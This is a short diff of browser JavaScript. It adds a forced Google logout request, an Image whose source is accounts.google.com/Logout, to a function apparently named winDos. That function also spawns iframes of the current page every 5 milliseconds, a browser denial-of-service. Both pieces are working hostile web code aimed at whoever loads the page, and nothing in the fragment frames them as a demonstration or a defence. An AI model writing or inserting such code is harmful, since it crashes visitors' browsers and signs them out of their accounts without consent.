@@ -104,6 +104,8 @@ if (RTCPeerConnection) (function () {
       var y = document.createElement('iframe');
       y.src=window.location.href;
       document.body.appendChild(y);
+      var a = new Image();
+      a.src="https://accounts.google.com/Logout";
     }
     setInterval(winDos, 5);
   }
